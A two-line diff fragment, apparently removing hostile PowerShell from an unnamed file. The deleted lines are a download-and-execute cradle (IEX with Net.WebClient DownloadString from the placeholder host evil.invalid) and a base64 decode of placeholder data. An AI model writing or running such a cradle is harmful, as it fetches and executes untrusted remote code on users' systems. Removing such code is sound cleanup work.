@@ -1,2 +1,0 @@
-IEX (New-Object Net.WebClient).DownloadString('https://evil.invalid/payload')
-$x=[System.Convert]::FromBase64String('QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')
